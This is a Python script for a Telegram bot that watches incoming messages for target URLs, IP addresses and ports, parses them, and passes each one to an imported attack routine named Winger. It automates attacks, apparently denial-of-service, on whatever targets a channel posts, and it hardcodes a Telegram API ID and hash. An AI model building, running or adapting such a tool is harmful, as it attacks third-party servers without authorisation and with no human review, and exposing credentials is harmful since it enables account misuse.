import asyncio
import re

from spam_units import Unit, IP, Port
from telethon import TelegramClient, events
from winger import Winger

# api_id and api_hash from https://my.telegram.org, under API Development.
api_id = 15915117
api_hash = '6722c0c8ed0b85aa09f9977ab243ff56'

client = TelegramClient('f.russia', api_id, api_hash)


def msg_parse_units(message: str) -> [Unit]:
    unit_strs = re.compile(
        r'(https?:\/\/[\w\-\.]+\.\w{2,5})\s+?\n((?:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s?\(.*\)\s?\n)+)',
        re.I | re.M
    ).findall(message)

    units = []
    for unit_str in unit_strs:
        unit = Unit(unit_str[0])

        ip_strs = re.compile(
            r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s?\(.*\)\s?\n)',
            re.I | re.M
        ).findall(unit_str[1])

        for ip_str in ip_strs:
            parsed_ip = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s\((.*)\)', re.I).findall(ip_str)[0]
            ip = IP(parsed_ip[0])

            port_strs = re.compile(r'(\d+)/(tcp|udp|http)', re.I).findall(parsed_ip[1])

            for port_str in port_strs:
                port = Port(port_str[0])
                port.protocol = port_str[1].lower()
                ip.ports.append(port)
            unit.ips.append(ip)
        units.append(unit)

    return units


def attack(units: [Unit]):
    for unit in units:
        Winger(unit).attack()


async def main():
    await client.start()
    pattern = re.compile(
        r'[\W\w]+(https?://[\w\-\.]+\.\w{2,5})|(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})|(\d+)/(tcp|udp|http)',
        re.M | re.I
    )

    @client.on(events.NewMessage(pattern=pattern))
    async def handler(event):
        # check whether the message contains any IP
        ips = re.compile(
            r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
            re.M
        ).findall(event.message.message)
        if len(ips) == 0:
            return

        units = msg_parse_units(event.message.message)
        attack(units)

    await client.run_until_disconnected()


asyncio.run(main())
